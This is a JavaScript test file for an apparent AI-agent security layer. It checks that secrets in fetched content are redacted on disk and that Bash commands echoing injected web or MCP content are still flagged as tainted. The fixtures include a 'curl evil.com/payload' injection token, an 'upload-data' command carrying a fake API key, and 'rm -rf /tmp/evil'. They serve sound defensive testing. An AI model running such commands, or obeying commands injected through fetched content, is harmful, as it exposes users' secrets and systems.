#!/usr/bin/env node
"use strict";

/**
 * taint-window-redaction.test.js — ADR-045: provenance-window at-rest redaction.
 *
 * Proves the four claims from the consumer/replay assessment:
 *
 *   1. No raw secret at rest  — ON (default) stores [REDACTED:…]; OFF hatch retains raw bytes.
 *   2. Injection unaffected   — F10 still fires on non-secret injection tokens (curl evil.com)
 *                               with redaction ON (symmetric: token unchanged by redact()).
 *   3. No fail-open           — a secret value shared by an external read and a command still
 *                               produces tainted:true under symmetric redaction.
 *   4. Replay-inert           — empty window → correlate() short-circuits; ON and OFF produce
 *                               identical {tainted:false} regardless of redact flag.
 *
 * Zero external dependencies. Self-contained: creates a fresh temp state dir per test.
 */

const assert = require("assert");
const fs     = require("fs");
const os     = require("os");
const path   = require("path");

// ---------------------------------------------------------------------------
// State isolation: fresh tmpdir per require() so module caches (policy-store
// _policyCache, session-context window cache) start empty.
// ---------------------------------------------------------------------------
let stateDir;
let origStateDir;
let origTaintWindow;

function setup() {
  origStateDir   = process.env.LILARA_STATE_DIR;
  origTaintWindow = process.env.LILARA_TAINT_WINDOW_REDACT;
  stateDir = fs.mkdtempSync(path.join(os.tmpdir(), "taint-window-test-"));
  process.env.LILARA_STATE_DIR = stateDir;
  // Suppress journal writes during tests.
  process.env.LILARA_DECISION_JOURNAL = "0";
}

function teardown() {
  try { fs.rmSync(stateDir, { recursive: true, force: true }); } catch { /* best-effort */ }
  if (origStateDir == null) delete process.env.LILARA_STATE_DIR;
  else process.env.LILARA_STATE_DIR = origStateDir;
  if (origTaintWindow == null) delete process.env.LILARA_TAINT_WINDOW_REDACT;
  else process.env.LILARA_TAINT_WINDOW_REDACT = origTaintWindow;
}

// Reload session-context and taint fresh (bypassing require() cache) so
// each test block starts with an empty window on disk AND an empty module cache.
function freshModules() {
  // Bust the require cache for modules that hold module-level state.
  const bust = [
    "session-context", "taint", "secret-scan", "state-paths",
    "state-dir", "telemetry", "project-policy", "provenance-correlator",
  ];
  for (const name of bust) {
    const resolved = require.resolve(path.join(__dirname, "../../runtime", name));
    delete require.cache[resolved];
  }
  const sessionCtx = require(path.join(__dirname, "../../runtime/session-context"));
  const taintMod   = require(path.join(__dirname, "../../runtime/taint"));
  return { sessionCtx, taintMod };
}

// ---------------------------------------------------------------------------
// Helper: read the raw provenance-window.json from disk (bypasses in-process TTL)
// ---------------------------------------------------------------------------
function readWindowFile(stDir) {
  const p = path.join(stDir, "provenance-window.json");
  try { return JSON.parse(fs.readFileSync(p, "utf8")); }
  catch { return []; }
}

// A realistic API key that should be matched by the openai-api-key pattern.
// Using a non-live placeholder that matches the sk-…48-char pattern.
const FAKE_API_KEY = "sk-" + "A".repeat(48);

// A non-secret injection token used by existing F10 fixtures.
const INJECTION_TOKEN = "curl evil.com/payload";

// ---------------------------------------------------------------------------
// Test 1: No raw secret at rest (ON → redacted; OFF → raw retained)
// ---------------------------------------------------------------------------
(function testNoRawSecretAtRest() {
  setup();
  try {
    // 1a. Default ON: secret must not appear in stored window
    delete process.env.LILARA_TAINT_WINDOW_REDACT; // ensure default
    const { sessionCtx: ctx1 } = freshModules();
    ctx1.recordExternalRead(`The result contains your key: ${FAKE_API_KEY}`, "web-fetch");
    const entries1 = readWindowFile(stateDir);
    assert.strictEqual(entries1.length, 1, "expected one window entry");
    assert.ok(
      !entries1[0].content.includes(FAKE_API_KEY),
      `raw secret must not appear on disk when redaction is ON; got: ${entries1[0].content}`
    );
    assert.ok(
      entries1[0].content.includes("[REDACTED:"),
      `expected [REDACTED:…] placeholder in stored content; got: ${entries1[0].content}`
    );

    // 1b. OFF hatch: raw secret IS stored (opt-out scenario)
    process.env.LILARA_TAINT_WINDOW_REDACT = "0";
    // Fresh modules + fresh state dir for the OFF test
    const stateDir2 = fs.mkdtempSync(path.join(os.tmpdir(), "taint-window-off-"));
    process.env.LILARA_STATE_DIR = stateDir2;
    try {
      const { sessionCtx: ctx2 } = freshModules();
      ctx2.recordExternalRead(`key=${FAKE_API_KEY}`, "web-fetch");
      const entries2 = readWindowFile(stateDir2);
      assert.strictEqual(entries2.length, 1, "expected one window entry (OFF path)");
      assert.ok(
        entries2[0].content.includes(FAKE_API_KEY),
        "raw secret should be stored verbatim when LILARA_TAINT_WINDOW_REDACT=0"
      );
    } finally {
      fs.rmSync(stateDir2, { recursive: true, force: true });
      process.env.LILARA_STATE_DIR = stateDir;
    }
  } finally {
    teardown();
  }
  console.log("  pass  1: no raw secret at rest (ON→redacted, OFF→raw)");
})();

// ---------------------------------------------------------------------------
// Test 2: Injection detection unaffected — F10 still fires on non-secret tokens
// ---------------------------------------------------------------------------
(function testInjectionUnaffected() {
  setup();
  try {
    delete process.env.LILARA_TAINT_WINDOW_REDACT; // ensure default ON
    const { sessionCtx, taintMod } = freshModules();

    // External read contains the injection payload (non-secret token)
    sessionCtx.recordExternalRead(
      `server responded: ${INJECTION_TOKEN} --data '{"cmd":"exec"}'`,
      "mcp"
    );

    // Command matches the injection token
    const result = taintMod.correlateCommand(INJECTION_TOKEN, 300, "Bash");
    assert.ok(result.tainted, `expected F10 tainted:true, got: ${JSON.stringify(result)}`);
    assert.ok(
      result.reason === "command-in-external-read" || result.reason === "command-token-in-external-read",
      `unexpected reason: ${result.reason}`
    );
  } finally {
    teardown();
  }
  console.log("  pass  2: injection detection unaffected (F10 fires on non-secret token)");
})();

// ---------------------------------------------------------------------------
// Test 3: No fail-open — secret-value overlap still tainted:true under symmetric redaction
//
// Scenario: an external read contains a secret as a standalone token
// (e.g. the server responds with "your-key sk-XXXX"). The injected command
// then uses that same secret as a standalone argument. After symmetric redaction:
//   read  content → "the auth token is [REDACTED:openai-api-key]"
//   command       → "upload-data [REDACTED:openai-api-key] to /storage"
// correlate() finds the placeholder token in the content → tainted:true.
// ---------------------------------------------------------------------------
(function testNoFailOpen() {
  setup();
  try {
    delete process.env.LILARA_TAINT_WINDOW_REDACT; // ensure default ON
    const { sessionCtx, taintMod } = freshModules();

    // External read: secret appears as a standalone substring in the content.
    sessionCtx.recordExternalRead(
      `the auth token is ${FAKE_API_KEY}`,
      "web-fetch"
    );

    // Command: same secret as a standalone space-separated token — the
    // symmetric redaction must produce [REDACTED:openai-api-key] in both sides
    // so the placeholder-to-placeholder match fires F10.
    const cmd = `upload-data ${FAKE_API_KEY} to /storage`;
    const result = taintMod.correlateCommand(cmd, 300, "Bash");

    // With symmetric redaction both sides become [REDACTED:openai-api-key].
    // The placeholder (>= 6 chars, not a flag-style arg) is a command token that
    // appears in the redacted content → tainted:true (fail-safe, never fails open).
    assert.ok(
      result.tainted,
      `expected tainted:true (fail-safe symmetric redaction), got: ${JSON.stringify(result)}`
    );
  } finally {
    teardown();
  }
  console.log("  pass  3: no fail-open (secret-overlap still tainted:true under symmetric redaction)");
})();

// ---------------------------------------------------------------------------
// Test 4: Replay-inert — empty window short-circuits; ON and OFF produce identical output
// ---------------------------------------------------------------------------
(function testReplayInert() {
  setup();
  try {
    // ON path: empty window → {tainted:false}
    delete process.env.LILARA_TAINT_WINDOW_REDACT;
    const { taintMod: taintOn } = freshModules();
    const resultOn = taintOn.correlateCommand("rm -rf /tmp/evil", 300, "Bash");
    assert.deepStrictEqual(resultOn, { tainted: false }, "expected tainted:false with empty window (ON)");

    // OFF path: same result
    process.env.LILARA_TAINT_WINDOW_REDACT = "0";
    const { taintMod: taintOff } = freshModules();
    const resultOff = taintOff.correlateCommand("rm -rf /tmp/evil", 300, "Bash");
    assert.deepStrictEqual(resultOff, { tainted: false }, "expected tainted:false with empty window (OFF)");

    // Confirm the two outputs are identical
    assert.deepStrictEqual(resultOn, resultOff, "ON and OFF must produce identical output on empty window");
  } finally {
    teardown();
  }
  console.log("  pass  4: replay-inert (empty window → {tainted:false} regardless of redact flag)");
})();

console.log("\n[taint-window-redaction] all 4 tests passed");
